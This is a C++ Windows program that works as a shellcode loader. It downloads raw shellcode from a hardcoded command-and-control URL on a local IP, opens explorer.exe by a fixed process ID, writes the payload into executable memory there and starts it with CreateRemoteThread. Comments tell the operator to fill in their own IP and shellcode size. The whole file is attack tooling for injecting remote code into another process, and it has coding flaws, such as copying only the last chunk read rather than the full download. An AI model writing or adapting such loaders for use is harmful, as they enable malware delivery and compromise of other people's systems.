#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
    
    //Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 503;
    int explorerPID = 4508;

    
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    

    //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://192.168.56.102:8000/index.raw";
    IStream* stream;
    
    //Update the buff[] variable to include your shellcode size
    char buff[dwSize];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    
    while (true) {
        //Update the Read file descriptor to include your shellcode size
        stream->Read(buff, dwSize, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
    
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    downloadAndExecute();
    return 0;
}